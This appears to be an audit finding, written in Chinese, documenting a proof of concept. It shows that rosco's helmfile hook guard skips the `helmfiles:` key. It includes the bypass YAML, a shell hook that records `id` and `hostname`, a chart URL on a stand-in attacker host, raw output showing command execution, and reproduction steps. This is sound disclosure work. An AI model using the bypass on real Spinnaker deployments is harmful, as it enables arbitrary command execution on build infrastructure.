@@ -1,0 +1,147 @@
+# F-01 · G1（`helmfiles:` 覆盖缺口）服务级实测
+
+日期：2026-09-19 04:49 UTC
+目标：rosco `http://localhost:8087`（`spinnaker-poc-rosco-1`，helmfile 1.7.0，含守卫的 main 构建）
+结论：**G1 从「源码级推断」升级为「服务级实测」** —— 守卫的*作用域*缺口，与解析器无关。
+
+---
+
+## 1. 实验设计：单变量 A/B，唯一变量是**键名**
+
+同一个子文件、同一个**绝对路径**、同一份内容。两个入口文件只差用哪个键引用它：
+
+| 臂 | 入口文件 | 守卫是否读该键 | 预期 |
+|---|---|---|---|
+| CONTROL | `bases: ["/tmp/g1sub/helmfile.yaml"]` | 读（`validateHelmfileYamlFile` 的 bases 分支，:317-331） | 拒绝 |
+| PAYLOAD | `helmfiles: [{path: /tmp/g1sub/helmfile.yaml}]` | **不读**（全类 `grep -n helmfiles` = **0 命中**） | 放行 |
+
+**CONTROL 臂的作用**：它证明守卫**能到达该磁盘文件**、能识别其 `hooks:`、能拒绝。
+所以 PAYLOAD 臂放行**不可能**被解释成"文件没找到所以跳过"。
+
+### 被引用的子文件（rosco 容器内 `/tmp/g1sub/helmfile.yaml`，548 字节）
+
+```yaml
+# G1: this sub-helmfile carries the `hooks:`. The entry helmfile only
+# references it through `helmfiles:`, a key the guard never inspects.
+hooks:
+  - events: ["prepare"]
+    command: "/bin/sh"
+    args:
+      - "-c"
+      - |
+        {
+          echo '=== G1 sub-helmfile hook executed ==='
+          id
+          hostname
+          date -u
+          echo "entry-file-had-no-hooks=true"
+        } > /tmp/G1_SUBHOOK.txt 2>&1
+        true
+releases:
+  - name: demo
+    namespace: default
+    chart: http://evil.example.com:8000/charts/demo-0.1.0.tgz
+```
+
+### 两个入口文件（HTTP 制品，由 attacker 容器 `/srv` 提供）
+
+`g1_entry_bases.yaml`（CONTROL）
+```yaml
+# G1 CONTROL ARM: identical target file at the identical absolute path, reached
+# via `bases:` -- a key the guard DOES resolve and validate. If the guard is
+# working at all, this one must be rejected with the hook-rejection 400.
+bases:
+  - /tmp/g1sub/helmfile.yaml
+```
+
+`g1_entry_helmfiles.yaml`（PAYLOAD）
+```yaml
+# G1 PAYLOAD ARM: the entry file declares NO hooks/postRenderers, so the
+# guard -- which only ever reads THIS file -- has nothing to object to.
+# helmfile, unlike the guard, follows `helmfiles:` and runs the sub-helmfile's
+# `hooks:` during the very same `helmfile template` invocation.
+helmfiles:
+  - path: /tmp/g1sub/helmfile.yaml
+```
+
+---
+
+## 2. 原始输出（`g1-ab.sh`，在 rosco 容器内执行）
+
+```
+################## CONTROL  (bases: -> guard validates it, must REJECT)   (g1_entry_bases.yaml)
+HTTP=400 bytes=525
+--- response (first 400 chars) ---
+{"timestamp":"2026-09-19T04:49:48.023+00:00","status":400,"error":"Bad Request","exception":"java.lang.IllegalArgumentException","message":"The helmfile content at /tmp/g1sub/helmfile.yaml declares `hooks`, which helmfile executes as an arbitrary local command/script even during 'helmfile template'. Rosco refuses to bake this helmfile by default because its content may not be as trusted as the pip
+--- sub-helmfile hook side effect ---
+  [ok] no marker - hook did not run
+
+################## PAYLOAD  (helmfiles: -> guard blind, expect PASS+hook)   (g1_entry_helmfiles.yaml)
+HTTP=200 bytes=249
+--- response (first 400 chars) ---
+{"type":"embedded/base64","customKind":false,"name":"poc-manifests","reference":"LS0tCiMgU291cmNlOiBkZW1vL3RlbXBsYXRlcy9jbS55YW1sCmFwaVZlcnNpb246IHYxCmtpbmQ6IENvbmZpZ01hcAptZXRhZGF0YToKICBuYW1lOiBkZW1vCmRhdGE6CiAgaGVsbG86IHdvcmxkCgo=","metadata":{}}
+--- sub-helmfile hook side effect ---
+  [!!] COMMAND EXECUTED - marker present:
+      === G1 sub-helmfile hook executed ===
+      uid=10111(spinnaker) gid=10111(spinnaker) groups=10111(spinnaker),10111(spinnaker)
+      44c48ade52c2
+      Sat Sep 19 04:49:48 UTC 2026
+      entry-file-had-no-hooks=true
+```
+
+CONTROL 臂 400 响应体里的 base64 解码（`reference` 字段，PAYLOAD 臂）：
+`# Source: demo/templates/cm.yaml` / `apiVersion: v1` / `kind: ConfigMap` / `metadata: name: demo` / `data: hello: world`
+→ **不只是守卫放行：helmfile 完整执行了子文件并产出了渲染结果**。
+
+---
+
+## 3. 判读
+
+| 观察 | 含义 |
+|---|---|
+| CONTROL 400 + 报错**点名** `/tmp/g1sub/helmfile.yaml` | 守卫确实读取了该路径，bases 分支工作正常 |
+| CONTROL 无 marker | 拒绝是有效的（hook 未执行） |
+| PAYLOAD 200 + `embedded/base64` 制品返回 | 守卫**未拒绝**，bake 正常完成 |
+| PAYLOAD marker 落地，`uid=10111(spinnaker)` | 子文件的 `hooks:` 在 `helmfile template` 期间执行了 |
+| 两臂唯一差异 = `bases:` vs `helmfiles:` | 失效点是守卫的**作用域**，不是解析、不是文件可达性 |
+
+---
+
+## 4. 实验简化（必须如实写入报告）
+
+子文件 `/tmp/g1sub/helmfile.yaml` 是**由测试者预置**在 rosco 容器内的，不是通过制品投递的。
+
+**原因**：本栈只有 `no-auth-http-account`（`http/file`）。而 `downloadArtifactToTmpFile`
+（`HelmBakeTemplateUtils.java:64-70`）把每个非 tarball 制品写成 **`UUID.randomUUID()` 命名的临时文件**，
+入口 helmfile 无法用相对路径引用"第二个制品"。同时 `getHelmTypePathFromArtifact`（:92-115）
+固定取 `inputArtifacts.get(0)` 作入口，其余制品走 `getValuePaths`。
+
+**真实部署形态**：制品源是 tarball（`git/repo` / `helm/image`），
+`env.downloadArtifactTarballAndExtract()` 解包后**入口与子文件同处一个目录树**，
+`helmfiles: [{path: sub/helmfile.yaml}]` 的相对路径天然成立。本实验用绝对路径 + 预置
+等价复现了该条件，并用 CONTROL 臂证明文件确实可被守卫读取——**简化只影响投递方式，不影响结论**。
+（若要消除该简化，需在 rosco 侧注册一个 `git/repo` 或 `helm/image` 制品账户。）
+
+---
+
+## 5. 复现命令
+
+```bash
+cd audit-spinnaker/stack
+
+# 1) 生成载荷
+python make-g1-payload.py
+
+# 2) 入口载荷 -> attacker 容器 web root（宿主目录即挂载点，/srv 是 :ro）
+cp http_poc/g1_entry_helmfiles.yaml http_poc/g1_entry_bases.yaml attacker/
+
+# 3) 子文件 -> rosco 容器（实验简化，见 §4）
+docker exec spinnaker-poc-rosco-1 mkdir -p /tmp/g1sub
+docker cp http_poc/g1sub/helmfile.yaml spinnaker-poc-rosco-1:/tmp/g1sub/helmfile.yaml
+
+# 4) 在 rosco 容器内跑 A/B（marker 落在 rosco 的 /tmp，必须在容器内执行）
+docker cp g1-ab.sh spinnaker-poc-rosco-1:/tmp/g1-ab.sh
+docker exec spinnaker-poc-rosco-1 bash /tmp/g1-ab.sh
+```
+
+⚠️ 必须在 rosco 容器内执行：marker 写在 **rosco 的 /tmp**，且 rosco 的 API 只在 docker 网络内可达。
